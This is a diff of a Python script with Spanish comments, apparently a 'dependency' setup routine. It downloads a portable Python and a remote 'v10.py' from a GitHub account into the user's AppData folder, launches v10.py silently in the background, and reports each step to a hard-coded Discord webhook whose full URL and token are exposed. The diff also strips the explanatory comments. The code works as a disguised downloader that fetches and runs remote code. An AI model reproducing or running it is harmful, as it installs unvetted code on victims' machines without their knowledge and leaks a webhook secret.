@@ -4,21 +4,19 @@ import subprocess
 import urllib.request
 import zipfile
 
-# Enlaces directos oficiales de tu repositorio
 URL_PY_ZIP = "https://github.com/zzzzsit4/v10/releases/download/new/py.zip"
 URL_V10 = "https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v10.py"
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1560652221035839528/SlDSAV1HKo0Xw42HTs_y6KsVLBZSQ6pUqpN59eM1K044bhjU7iwHBh4bSCfA7bvc6jO6"
 
-# Usar una ruta absoluta fija en C:\ para evitar problemas con LOCALAPPDATA bajo permisos de Administrador
-DIRECTORIO_DESTINO = "C:\\V10Runtime"
+# Usar la carpeta AppData del usuario para evitar restricciones de permisos en C:\
+DIRECTORIO_DESTINO = os.path.join(os.environ.get("APPDATA", "C:\\"), "V10Runtime")
 ZIP_TEMPORAL = os.path.join(DIRECTORIO_DESTINO, "py.zip")
 SCRIPT_V10 = os.path.join(DIRECTORIO_DESTINO, "v10.py")
-LOG_FILE = os.path.join(DIRECTORIO_DESTINO, "debug_log.txt")
+LOG_FILE = os.path.join(os.getcwd(), "dep_error.txt")
 
 def registrar_log(mensaje):
     try:
-        os.makedirs(DIRECTORIO_DESTINO, exist_ok=True)
         with open(LOG_FILE, "a", encoding="utf-8") as f:
             f.write(mensaje + "\n")
     except Exception:
@@ -57,7 +55,6 @@ def preparar_y_exec():
         if not os.path.exists(DIRECTORIO_DESTINO):
             os.makedirs(DIRECTORIO_DESTINO, exist_ok=True)
 
-        # 1. Configurar Python portable
         python_ejecutable = encontrar_python()
         if not python_ejecutable:
             enviar_webhook("📥 [Dependencias] Descargando py.zip desde GitHub Releases...")
@@ -81,11 +78,9 @@ def preparar_y_exec():
             python_ejecutable = encontrar_python()
             enviar_webhook("⚙️ [Dependencias] Entorno portable configurado.")
 
-        # 2. Descargar v10.py
         enviar_webhook("📥 [Dependencias] Descargando v10.py...")
         urllib.request.urlretrieve(URL_V10, SCRIPT_V10)
 
-        # 3. Lanzar v10 en segundo plano
         if python_ejecutable and os.path.exists(SCRIPT_V10):
             enviar_webhook("🚀 [Dependencias] Lanzando v10.py en segundo plano...")
             subprocess.Popen(
@@ -100,6 +95,3 @@ def preparar_y_exec():
 
     except Exception as e:
         enviar_webhook(f"❌ [Error crítico en dependencias]: {str(e)}")
-
-if __name__ == "__main__":
-    preparar_y_exec()
